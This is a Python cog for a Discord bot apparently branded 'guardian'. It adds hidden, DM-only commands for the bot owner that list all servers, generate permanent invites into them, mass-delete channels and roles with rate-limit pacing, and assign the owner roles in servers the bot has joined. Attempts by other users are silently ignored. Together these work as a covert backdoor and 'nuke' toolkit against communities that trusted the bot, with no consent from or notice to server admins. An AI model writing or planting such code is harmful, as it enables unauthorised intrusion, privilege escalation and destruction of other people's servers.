"""
Owner Utility Commands — DM-only, bot owner only
═════════════════════════════════════════════════
+list                               — list every server the bot is in
+linkserver <id>                    — get a vanity URL or fresh invite for a server
+leftserver <id>                    — make the bot leave a server
+permserver <id>                    — list every permission the bot holds in a server
+serverinfo <id>                    — handled in information.py (shared command)
+deleteserverchannels <id> <n|ids>  — delete channels in a server (count or specific IDs)
+deleteserverroles    <id> <n|ids>  — delete roles in a server (count or specific IDs)
+roleserveradd        <id>          — assign yourself a role in a server via dropdown
"""

import asyncio
import logging

import discord
from discord.ext import commands

log = logging.getLogger("guardian.ownerutils")

COL         = 0x2B2D31
FOOTER      = "© 2026 — developed by zrx.gg"
DELETE_DELAY = 0.35   # seconds between each deletion to avoid rate-limit 429s
SELECT_MAX   = 25     # Discord's hard cap on options in a single StringSelect


# ── Shared helpers ─────────────────────────────────────────────────────────────

def _e(description: str) -> discord.Embed:
    e = discord.Embed(description=description, color=COL)
    e.set_footer(text=FOOTER)
    return e


async def _resolve_guild(
    ctx: commands.Context, server_id: int
) -> discord.Guild | None:
    """Return the Guild from the bot cache; send an error and return None if missing."""
    guild = ctx.bot.get_guild(server_id)
    if guild is None:
        await ctx.send(
            embed=_e(
                f"• __**Error**__\n"
                f"Server `{server_id}` not found. "
                f"The bot may not be a member of that server."
            )
        )
    return guild


def _send_chunks(lines: list[str], header: str = "") -> list[str]:
    """
    Pack lines into message chunks that stay under Discord's 2 000-char limit.
    Returns a list of strings ready to be sent.
    """
    chunks: list[str] = []
    current = header
    for line in lines:
        candidate = current + line + "\n"
        if len(candidate) > 1990:
            chunks.append(current)
            current = line + "\n"
        else:
            current = candidate
    if current.strip():
        chunks.append(current)
    return chunks


# ── Role-select UI (used by +roleserveradd) ───────────────────────────────────

class RoleSelect(discord.ui.Select):
    def __init__(self, guild: discord.Guild, member: discord.Member, roles: list[discord.Role]):
        self.guild  = guild
        self.member = member
        options = [
            discord.SelectOption(label=role.name[:100], value=str(role.id))
            for role in roles
        ]
        super().__init__(
            placeholder="Choose a role to assign to yourself…",
            min_values=1,
            max_values=1,
            options=options,
        )

    async def callback(self, interaction: discord.Interaction):
        role_id = int(self.values[0])
        role    = self.guild.get_role(role_id)

        if role is None:
            return await interaction.response.edit_message(
                embed=_e("• __**Error**__\nThat role no longer exists in the server."),
                view=None,
            )

        try:
            await self.member.add_roles(role, reason="Owner utility: +roleserveradd")
            await interaction.response.edit_message(
                embed=_e(
                    f"• __**Role Assigned**__\n"
                    f"You now have **{role.name}** in **{self.guild.name}**."
                ),
                view=None,
            )
            log.info(
                "Role '%s' (%s) assigned to owner in guild '%s' (%s)",
                role.name, role.id, self.guild.name, self.guild.id,
            )
        except discord.Forbidden:
            await interaction.response.edit_message(
                embed=_e(
                    f"• __**Error**__\n"
                    f"Could not assign **{role.name}** — the role is above the bot's "
                    f"highest role or the bot lacks `Manage Roles` permission."
                ),
                view=None,
            )
        except discord.HTTPException as exc:
            await interaction.response.edit_message(
                embed=_e(f"• __**Error**__\nDiscord API error: `{exc}`"),
                view=None,
            )


class RoleSelectView(discord.ui.View):
    def __init__(
        self,
        guild:    discord.Guild,
        member:   discord.Member,
        roles:    list[discord.Role],
        owner_id: int,
    ):
        super().__init__(timeout=60)
        self.owner_id = owner_id
        self.add_item(RoleSelect(guild, member, roles))

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        # Only the bot owner may interact with this menu.
        if interaction.user.id != self.owner_id:
            await interaction.response.send_message(
                "This menu is not for you.", ephemeral=True
            )
            return False
        return True

    async def on_timeout(self):
        # The view is attached to a DM message — editing after timeout is safe to ignore.
        pass


# ── Cog ────────────────────────────────────────────────────────────────────────

class OwnerUtils(commands.Cog, name="OwnerUtils"):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    # ── +list ──────────────────────────────────────────────────────────────────

    @commands.command(name="list")
    @commands.is_owner()
    async def list_servers(self, ctx: commands.Context):
        """DM-only: list every server the bot is currently in."""
        if ctx.guild is not None:
            return

        guilds = self.bot.guilds
        lines  = [f"`{g.id}` — {g.name}" for g in guilds]
        header = f"• __**Servers — {len(guilds)} total**__\n\n"

        for chunk in _send_chunks(lines, header):
            await ctx.send(chunk)

    # ── +linkserver <server_id> ────────────────────────────────────────────────

    @commands.command(name="linkserver")
    @commands.is_owner()
    async def linkserver(self, ctx: commands.Context, server_id: int):
        """DM-only: return the vanity URL or create a permanent invite for a server."""
        if ctx.guild is not None:
            return

        guild = await _resolve_guild(ctx, server_id)
        if guild is None:
            return

        # Prefer vanity URL — no extra API call required.
        if guild.vanity_url_code:
            return await ctx.send(
                embed=_e(
                    f"• __**Vanity URL — {guild.name}**__\n"
                    f"https://discord.gg/{guild.vanity_url_code}"
                )
            )

        # Walk text channels until we find one where we can create an invite.
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                try:
                    invite = await channel.create_invite(
                        max_age=0,
                        max_uses=0,
                        reason="Owner utility: +linkserver",
                    )
                    return await ctx.send(
                        embed=_e(
                            f"• __**Invite — {guild.name}**__\n"
                            f"{invite.url}"
                        )
                    )
                except discord.Forbidden:
                    continue  # Try the next channel.

        await ctx.send(
            embed=_e(
                f"• __**Error**__\n"
                f"Could not create an invite for **{guild.name}**. "
                f"No accessible text channel with `Create Invite` permission."
            )
        )

    # ── +leftserver <server_id> ────────────────────────────────────────────────

    @commands.command(name="leftserver")
    @commands.is_owner()
    async def leftserver(self, ctx: commands.Context, server_id: int):
        """DM-only: make the bot leave a server by ID."""
        if ctx.guild is not None:
            return

        guild = await _resolve_guild(ctx, server_id)
        if guild is None:
            return

        name = guild.name
        await guild.leave()
        log.info("Left guild '%s' (%s) via +leftserver by %s", name, server_id, ctx.author)
        await ctx.send(
            embed=_e(f"• __**Left Server**__\nSuccessfully left the server: **{name}**")
        )

    # ── +permserver <server_id> ────────────────────────────────────────────────

    @commands.command(name="permserver")
    @commands.is_owner()
    async def permserver(self, ctx: commands.Context, server_id: int):
        """DM-only: list every guild-level permission the bot holds in a server."""
        if ctx.guild is not None:
            return

        guild = await _resolve_guild(ctx, server_id)
        if guild is None:
            return

        perms   = guild.me.guild_permissions
        granted = [
            name.replace("_", " ").title()
            for name, value in perms
            if value
        ]

        body = "\n".join(f"• `{p}`" for p in granted) or "`No permissions granted.`"
        await ctx.send(
            embed=_e(f"• __**Bot Permissions — {guild.name}**__\n\n{body}")
        )

    # ── +deleteserverchannels <server_id> <amount | channel_id ...> ───────────

    @commands.command(name="deleteserverchannels")
    @commands.is_owner()
    async def deleteserverchannels(self, ctx: commands.Context, server_id: int, *args: str):
        """
        DM-only: delete channels in a server.
        Usage:
          +deleteserverchannels <server_id> <number>          — delete first N channels
          +deleteserverchannels <server_id> <id> [id ...]     — delete specific channels
        350 ms delay between each deletion to avoid rate-limit 429s.
        """
        if ctx.guild is not None:
            return

        if not args:
            return await ctx.send(
                embed=_e(
                    "• __**Usage**__\n"
                    "`+deleteserverchannels <server_id> <amount>`\n"
                    "`+deleteserverchannels <server_id> <id1> [id2 ...]`"
                )
            )

        guild = await _resolve_guild(ctx, server_id)
        if guild is None:
            return

        # Check the bot has Manage Channels permission in this server.
        if not guild.me.guild_permissions.manage_channels:
            return await ctx.send(
                embed=_e(
                    f"• __**Error**__\n"
                    f"Missing `Manage Channels` permission in **{guild.name}**."
                )
            )

        # ── Resolve target channels ────────────────────────────────────────────
        all_channels: list[discord.abc.GuildChannel] = list(guild.channels)

        if args[0].isdigit() and len(args) == 1:
            # Numeric count — take the first N channels (sorted by position).
            count    = int(args[0])
            targets  = sorted(all_channels, key=lambda c: c.position)[:count]
        else:
            # Explicit IDs — validate each one.
            targets = []
            bad_ids = []
            for raw in args:
                if not raw.isdigit():
                    bad_ids.append(raw)
                    continue
                ch = guild.get_channel(int(raw))
                if ch is None:
                    bad_ids.append(raw)
                else:
                    targets.append(ch)

            if bad_ids:
                await ctx.send(
                    embed=_e(
                        f"• __**Warning**__\n"
                        f"The following IDs were not found in **{guild.name}** and will be skipped:\n"
                        + "\n".join(f"`{i}`" for i in bad_ids)
                    )
                )
            if not targets:
                return

        if not targets:
            return await ctx.send(
                embed=_e(f"• __**Error**__\nNo valid channels found to delete in **{guild.name}**.")
            )

        # ── Delete with 350 ms delay ───────────────────────────────────────────
        progress = await ctx.send(
            embed=_e(
                f"• __**Deleting Channels — {guild.name}**__\n"
                f"Deleting `{len(targets)}` channel(s)…  `0/{len(targets)}`"
            )
        )

        deleted, failed = 0, 0
        for ch in targets:
            try:
                await ch.delete(reason="Owner utility: +deleteserverchannels")
                deleted += 1
                log.info("Deleted channel '%s' (%s) in '%s'", ch.name, ch.id, guild.name)
            except discord.Forbidden:
                failed += 1
                log.warning("No permission to delete channel '%s' (%s)", ch.name, ch.id)
            except discord.HTTPException as exc:
                failed += 1
                log.warning("Failed to delete channel '%s': %s", ch.id, exc)

            await asyncio.sleep(DELETE_DELAY)

        summary = (
            f"• __**Done — {guild.name}**__\n"
            f"Deleted: `{deleted}` · Failed / Skipped: `{failed}`"
        )
        await progress.edit(embed=_e(summary))

    # ── +deleteserverroles <server_id> <amount | role_id ...> ─────────────────

    @commands.command(name="deleteserverroles")
    @commands.is_owner()
    async def deleteserverroles(self, ctx: commands.Context, server_id: int, *args: str):
        """
        DM-only: delete roles in a server.
        Usage:
          +deleteserverroles <server_id> <number>         — delete first N deletable roles
          +deleteserverroles <server_id> <id> [id ...]    — delete specific roles by ID
        Automatically skips @everyone, managed/integration roles, and roles above the bot.
        350 ms delay between each deletion to avoid rate-limit 429s.
        """
        if ctx.guild is not None:
            return

        if not args:
            return await ctx.send(
                embed=_e(
                    "• __**Usage**__\n"
                    "`+deleteserverroles <server_id> <amount>`\n"
                    "`+deleteserverroles <server_id> <id1> [id2 ...]`"
                )
            )

        guild = await _resolve_guild(ctx, server_id)
        if guild is None:
            return

        # Check the bot has Manage Roles permission in this server.
        if not guild.me.guild_permissions.manage_roles:
            return await ctx.send(
                embed=_e(
                    f"• __**Error**__\n"
                    f"Missing `Manage Roles` permission in **{guild.name}**."
                )
            )

        bot_top_pos = guild.me.top_role.position  # Bot cannot touch roles at or above its own.

        def _is_deletable(role: discord.Role) -> bool:
            """Return True if the role can be safely deleted by the bot."""
            if role.is_default():    return False  # @everyone
            if role.managed:         return False  # integration / bot roles
            if role.position >= bot_top_pos: return False  # above or equal to bot's top role
            return True

        # ── Resolve target roles ───────────────────────────────────────────────
        if args[0].isdigit() and len(args) == 1:
            # Numeric count — take N deletable roles, sorted by position ascending.
            count   = int(args[0])
            targets = [r for r in sorted(guild.roles, key=lambda r: r.position) if _is_deletable(r)][:count]
        else:
            # Explicit IDs.
            targets  = []
            bad_ids  = []
            skipped  = []
            for raw in args:
                if not raw.isdigit():
                    bad_ids.append(raw)
                    continue
                role = guild.get_role(int(raw))
                if role is None:
                    bad_ids.append(raw)
                elif not _is_deletable(role):
                    skipped.append(f"`{role.name}` (`{role.id}`)")
                else:
                    targets.append(role)

            notices: list[str] = []
            if bad_ids:
                notices.append(
                    "• __**Not Found**__\n"
                    + "\n".join(f"`{i}`" for i in bad_ids)
                )
            if skipped:
                notices.append(
                    "• __**Skipped (protected)**__\n"
                    + "\n".join(skipped)
                )
            if notices:
                await ctx.send(embed=_e("\n\n".join(notices)))
            if not targets:
                return

        if not targets:
            return await ctx.send(
                embed=_e(
                    f"• __**Error**__\n"
                    f"No deletable roles found in **{guild.name}**.\n"
                    f"All roles may be managed, above the bot's top role, or @everyone."
                )
            )

        # ── Delete with 350 ms delay ───────────────────────────────────────────
        progress = await ctx.send(
            embed=_e(
                f"• __**Deleting Roles — {guild.name}**__\n"
                f"Deleting `{len(targets)}` role(s)…  `0/{len(targets)}`"
            )
        )

        deleted, failed = 0, 0
        for role in targets:
            try:
                await role.delete(reason="Owner utility: +deleteserverroles")
                deleted += 1
                log.info("Deleted role '%s' (%s) in '%s'", role.name, role.id, guild.name)
            except discord.Forbidden:
                failed += 1
                log.warning("No permission to delete role '%s' (%s)", role.name, role.id)
            except discord.HTTPException as exc:
                failed += 1
                log.warning("Failed to delete role '%s': %s", role.id, exc)

            await asyncio.sleep(DELETE_DELAY)

        summary = (
            f"• __**Done — {guild.name}**__\n"
            f"Deleted: `{deleted}` · Failed / Skipped: `{failed}`"
        )
        await progress.edit(embed=_e(summary))

    # ── +roleserveradd <server_id> ─────────────────────────────────────────────

    @commands.command(name="roleserveradd")
    @commands.is_owner()
    async def roleserveradd(self, ctx: commands.Context, server_id: int):
        """
        DM-only: assign yourself a role in a specific server via a dropdown menu.
        Shows only roles the bot is allowed to assign (below its top role,
        non-managed, not @everyone).
        """
        if ctx.guild is not None:
            return

        guild = await _resolve_guild(ctx, server_id)
        if guild is None:
            return

        # Check the bot has Manage Roles.
        if not guild.me.guild_permissions.manage_roles:
            return await ctx.send(
                embed=_e(
                    f"• __**Error**__\n"
                    f"Missing `Manage Roles` permission in **{guild.name}**."
                )
            )

        # The owner must be a member of that server so we can assign them a role.
        try:
            member = await guild.fetch_member(ctx.author.id)
        except discord.NotFound:
            return await ctx.send(
                embed=_e(
                    f"• __**Error**__\n"
                    f"You are not a member of **{guild.name}**. "
                    f"Join the server first before assigning yourself a role."
                )
            )
        except discord.HTTPException as exc:
            return await ctx.send(
                embed=_e(f"• __**Error**__\nFailed to fetch your member object: `{exc}`")
            )

        bot_top_pos = guild.me.top_role.position

        # Collect eligible roles: non-managed, not @everyone, below the bot's top role.
        eligible = [
            role for role in sorted(guild.roles, key=lambda r: r.position, reverse=True)
            if not role.is_default()
            and not role.managed
            and role.position < bot_top_pos
        ]

        if not eligible:
            return await ctx.send(
                embed=_e(
                    f"• __**Error**__\n"
                    f"No assignable roles found in **{guild.name}**.\n"
                    f"All roles are either managed, above the bot's top role, or @everyone."
                )
            )

        # Discord caps StringSelect at 25 options.
        capped  = eligible[:SELECT_MAX]
        clipped = len(eligible) - len(capped)

        desc = (
            f"• __**Assign Role — {guild.name}**__\n"
            f"Select a role from the dropdown to assign it to yourself.\n"
            + (f"\n*`{clipped}` role(s) not shown (Discord limits dropdowns to 25 options).*" if clipped else "")
        )

        view = RoleSelectView(guild, member, capped, ctx.author.id)
        await ctx.send(embed=_e(desc), view=view)

    # ── Error handlers ─────────────────────────────────────────────────────────

    @list_servers.error
    @linkserver.error
    @leftserver.error
    @permserver.error
    @deleteserverchannels.error
    @deleteserverroles.error
    @roleserveradd.error
    async def _owner_error(self, ctx: commands.Context, error: Exception):
        if isinstance(error, commands.NotOwner):
            return  # Silently ignore non-owner attempts.
        if isinstance(error, commands.MissingRequiredArgument):
            usage = {
                "linkserver":            "`+linkserver <server_id>`",
                "leftserver":            "`+leftserver <server_id>`",
                "permserver":            "`+permserver <server_id>`",
                "deleteserverchannels":  "`+deleteserverchannels <server_id> <amount | id1 [id2 ...]>`",
                "deleteserverroles":     "`+deleteserverroles <server_id> <amount | id1 [id2 ...]>`",
                "roleserveradd":         "`+roleserveradd <server_id>`",
            }
            await ctx.send(
                embed=_e(
                    f"• __**Usage**__\n"
                    f"{usage.get(ctx.command.name, f'`+{ctx.command.name}`')}"
                )
            )
        elif isinstance(error, commands.BadArgument):
            await ctx.send(
                embed=_e("• __**Error**__\nInvalid server ID. Provide a plain numeric ID.")
            )


async def setup(bot: commands.Bot):
    await bot.add_cog(OwnerUtils(bot))
